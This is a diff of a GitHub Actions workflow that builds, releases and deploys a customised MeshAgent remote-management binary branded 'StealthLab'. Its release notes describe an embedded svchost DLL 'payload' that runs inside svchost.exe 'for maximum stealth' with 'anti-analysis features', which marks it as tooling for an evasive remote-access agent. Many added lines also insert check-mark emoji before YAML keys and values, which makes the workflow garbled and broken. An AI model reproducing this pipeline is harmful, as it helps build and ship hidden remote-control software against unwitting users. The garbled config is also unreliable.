@@ -1,4 +1,4 @@
-﻿name: Build and Release Custom MeshAgent
+name: Build and Release Custom MeshAgent
 
 concurrency:
   group: meshagent-build-${{ github.ref }}
@@ -8,7 +8,7 @@ on:
   push:
     branches: [ main, master ]
     tags:
-      - 'v*'
+      - ✅'v*'
   pull_request:
     branches: [ main, master ]
   workflow_dispatch:
@@ -44,34 +44,34 @@ jobs:
       matrix:
         arch: [x64, x86]
         include:
-          - arch: x64
+          - ✅arch: x64
             platform: x64
             output_name: MeshService64.exe
-          - arch: x86
+          - ✅arch: x86
             platform: x86
             output_name: MeshService.exe
 
     steps:
-      - name: Checkout repository
+      - ✅name: Checkout repository
         uses: actions/checkout@v4
         with:
           submodules: recursive
           fetch-depth: 0
 
-      - name: Add MSBuild to PATH
+      - ✅name: Add MSBuild to PATH
         uses: microsoft/setup-msbuild@v1.1
 
-      - name: Setup NuGet
+      - ✅name: Setup NuGet
         uses: NuGet/setup-nuget@v2
         with:
           nuget-version: '6.x'
 
-      - name: Setup Python
+      - ✅name: Setup Python
         uses: actions/setup-python@v5
         with:
           python-version: '3.x'
 
-      - name: Cache NuGet packages
+      - ✅name: Cache NuGet packages
         uses: actions/cache@v4
         with:
           path: |
@@ -81,7 +81,7 @@ jobs:
           restore-keys: |
             ${{ runner.os }}-nuget-
 
-      - name: Fetch branding configuration
+      - ✅name: Fetch branding configuration
         id: fetch_config
         shell: pwsh
         run: |
@@ -160,7 +160,7 @@ jobs:
             Get-Content "./branding_config.json"
           }
 
-      - name: Generate branding headers
+      - ✅name: Generate branding headers
         shell: pwsh
         run: |
           $script = @'
@@ -194,7 +194,7 @@ jobs:
           alpn_list = alpn_source if isinstance(alpn_source, list) else [str(alpn_source)]
           alpn = ",".join(alpn_list)
 
-          header = f'''/* Generated file - do not edit. */
+          header = f'''/* Generated file - ✅do not edit. */
           #ifndef GENERATED_MESHAGENT_BRANDING_H
           #define GENERATED_MESHAGENT_BRANDING_H
           #undef MESH_AGENT_SERVICE_FILE
@@ -239,7 +239,7 @@ jobs:
           $script | Out-File -FilePath "generate_branding.py" -Encoding utf8
           python generate_branding.py
 
-      - name: Restore NuGet packages
+      - ✅name: Restore NuGet packages
         shell: pwsh
         run: |
           Write-Host "Restoring NuGet packages for MeshAgent-2022.sln"
@@ -256,8 +256,7 @@ jobs:
             Start-Sleep -Seconds 10
           }
 
-      - name: Build StealthLab DLL (${{ matrix.arch }})
-        if: matrix.arch == 'x64'
+      - name: Build StealthLab DLL payload
         shell: pwsh
         run: |
           Write-Host "Building StealthLab DLL for embedding..."
@@ -294,43 +293,44 @@ jobs:
             /fl `
             /flp:logfile=build_stealthlab_${{ matrix.arch }}.log
 
-      - name: Locate and rename binary
+      - ✅name: Locate and rename binary
         id: locate_binary
         shell: pwsh
         run: |
           $targetName = "${{ matrix.output_name }}"
-          # Look for StealthLab builds first, fallback to Release
-          $exePath = Get-ChildItem -Path "." -Recurse -Filter "MeshService-2022.exe" | Where-Object {
-            $_.DirectoryName -like "*StealthLab*" -and $_.DirectoryName -like "*${{ matrix.arch }}*"
-          } | Select-Object -First 1
+          $arch = '${{ matrix.arch }}'
+
+          $exePath = Get-ChildItem -Path "." -Recurse -Filter "MeshService-2022.exe" |
+            Where-Object {
+              if ($arch -eq 'x86') {
+                $_.DirectoryName -match "\\meshservice\\StealthLab($|\\)"
+              } else {
+                $_.DirectoryName -match "\\meshservice\\x64\\StealthLab($|\\)"
+              }
+            } |
+            Select-Object -First 1
 
           if (-not $exePath) {
-            $exePath = Get-ChildItem -Path "." -Recurse -Filter $targetName | Where-Object {
-              $_.DirectoryName -like "*Release*"
-            } | Select-Object -First 1
-          }
-
-          if ($exePath) {
-            New-Item -ItemType Directory -Force -Path "./artifacts" | Out-Null
-            Copy-Item $exePath.FullName -Destination "./artifacts/$targetName"
-
-            # Verify file size
-            $sizeMB = [math]::Round((Get-Item "./artifacts/$targetName").Length / 1MB, 2)
-            Write-Host "Binary size: $sizeMB MB"
-
-            if ($sizeMB -lt 5.0) {
-              Write-Host "WARNING: Binary is too small ($sizeMB MB). Expected ~5.7 MB for StealthLab build with embedded DLL!" -ForegroundColor Yellow
-            } else {
-              Write-Host "SUCCESS: StealthLab binary with embedded DLL ($sizeMB MB)" -ForegroundColor Green
-            }
-
-            echo "artifact_path=./artifacts/$targetName" >> $env:GITHUB_OUTPUT
-          } else {
-            Write-Host "ERROR: Could not find built executable"
+            Write-Host "ERROR: StealthLab build for $arch was not found." -ForegroundColor Red
             exit 1
           }
 
-      - name: Upload build logs (if exists)
+          New-Item -ItemType Directory -Force -Path "./artifacts" | Out-Null
+          $destination = Join-Path "./artifacts" $targetName
+          Copy-Item $exePath.FullName -Destination $destination -Force
+
+          $sizeMB = [math]::Round((Get-Item $destination).Length / 1MB, 2)
+          Write-Host "StealthLab binary size: $sizeMB MB"
+
+          if ($sizeMB -lt 5.0) {
+            Write-Host "WARNING: Binary is too small ($sizeMB MB). Expected ~5+ MB for StealthLab build with embedded DLL!" -ForegroundColor Yellow
+          } else {
+            Write-Host "SUCCESS: StealthLab binary with embedded DLL ($sizeMB MB)" -ForegroundColor Green
+          }
+
+          echo "artifact_path=$destination" >> $env:GITHUB_OUTPUT
+
+      - ✅name: Upload build logs (if exists)
         if: always()
         uses: actions/upload-artifact@v4
         with:
@@ -339,14 +339,14 @@ jobs:
           if-no-files-found: ignore
           retention-days: 30
 
-      - name: Upload StealthLab binary artifact
+      - ✅name: Upload StealthLab binary artifact
         uses: actions/upload-artifact@v4
         with:
           name: StealthLab-${{ matrix.output_name }}
           path: ./artifacts/${{ matrix.output_name }}
           retention-days: 90
 
-      - name: Upload StealthLab DLL (x64 only)
+      - ✅name: Upload StealthLab DLL (x64 only)
         if: matrix.arch == 'x64'
         uses: actions/upload-artifact@v4
         with:
@@ -354,7 +354,7 @@ jobs:
           path: meshservice/x64/StealthLab_DLL/MeshService-2022.dll
           retention-days: 90
 
-      - name: Upload to release (on tag)
+      - ✅name: Upload to release (on tag)
         if: startsWith(github.ref, 'refs/tags/v')
         uses: softprops/action-gh-release@v2
         with:
@@ -378,12 +378,12 @@ jobs:
       (github.event_name == 'workflow_dispatch' && github.event.inputs.deploy_to_server == 'true') ||
       (github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v'))
     steps:
-      - name: Download artifacts
+      - ✅name: Download artifacts
         uses: actions/download-artifact@v4
         with:
           path: ./artifacts
 
-      - name: Setup SSH
+      - ✅name: Setup SSH
         if: ${{ env.SSH_PRIVATE_KEY != '' }}
         run: |
           mkdir -p ~/.ssh
@@ -391,7 +391,7 @@ jobs:
           chmod 600 ~/.ssh/id_rsa
           ssh-keyscan -H ${{ env.DEPLOY_HOST }} >> ~/.ssh/ssh_known_hosts
 
-      - name: Setup SSH with password
+      - ✅name: Setup SSH with password
         if: ${{ env.SSH_PRIVATE_KEY == '' && env.SSH_PASSWORD != '' }}
         run: |
           sudo apt-get update -y
@@ -399,7 +399,7 @@ jobs:
           mkdir -p ~/.ssh
           ssh-keyscan -H ${{ env.DEPLOY_HOST }} >> ~/.ssh/ssh_known_hosts
 
-      - name: Deploy with key
+      - ✅name: Deploy with key
         if: ${{ env.SSH_PRIVATE_KEY != '' }}
         run: |
           USERNAME=${{ env.SSH_USER != '' && env.SSH_USER || 'root' }}
@@ -427,7 +427,7 @@ jobs:
           systemctl start meshcentral
           ENDSSH
 
-      - name: Deploy with password
+      - ✅name: Deploy with password
         if: ${{ env.SSH_PRIVATE_KEY == '' && env.SSH_PASSWORD != '' }}
         env:
           SSHPASS: ${{ env.SSH_PASSWORD }}
@@ -454,7 +454,7 @@ jobs:
           systemctl start meshcentral
           ENDSSH
 
-      - name: Verify deployment
+      - ✅name: Verify deployment
         if: ${{ env.SSH_PRIVATE_KEY != '' || env.SSH_PASSWORD != '' }}
         run: |
           sleep 10
@@ -470,12 +470,12 @@ jobs:
     runs-on: ubuntu-latest
     if: startsWith(github.ref, 'refs/tags/v')
     steps:
-      - name: Download all artifacts
+      - ✅name: Download all artifacts
         uses: actions/download-artifact@v4
         with:
           path: ./artifacts
 
-      - name: Create release notes
+      - ✅name: Create release notes
         run: |
           cat > release_notes.md << 'EOF'
           ## MeshAgent StealthLab Binaries
@@ -483,13 +483,13 @@ jobs:
           This release contains **StealthLab** MeshAgent binaries with embedded svchost DLL payload:
 
           ### Files:
-          - **MeshService64.exe** (x64, ~5.7 MB) - StealthLab build with embedded DLL
-          - **MeshService.exe** (x86, ~5.1 MB) - StealthLab build with embedded DLL
-          - **diagsvc.dll** (2.4 MB) - Svchost DLL payload
+          - ✅**MeshService64.exe** (x64, ~5.7 MB) - ✅StealthLab build with embedded DLL
+          - ✅**MeshService.exe** (x86, ~5.1 MB) - ✅StealthLab build with embedded DLL
+          - ✅**diagsvc.dll** (2.4 MB) - ✅Svchost DLL payload
 
           ### Features:
           - ✅ Embedded svchost DLL payload (SVCHOSTDLL resource)
-          - ✅ Automatic DLL extraction when `STEALTH_BUNDLE_EXTRACT=1`
+          - ✅ Automatic DLL extraction when  `STEALTH_BUNDLE_EXTRACT=1` 
           - ✅ Runs inside svchost.exe for maximum stealth
           - ✅ All StealthLab anti-analysis features enabled
 
@@ -504,7 +504,7 @@ jobs:
           **DLL Embedded:** Yes
           EOF
 
-      - name: Create GitHub Release (aggregate)
+      - ✅name: Create GitHub Release (aggregate)
         uses: softprops/action-gh-release@v2
         with:
           files: |
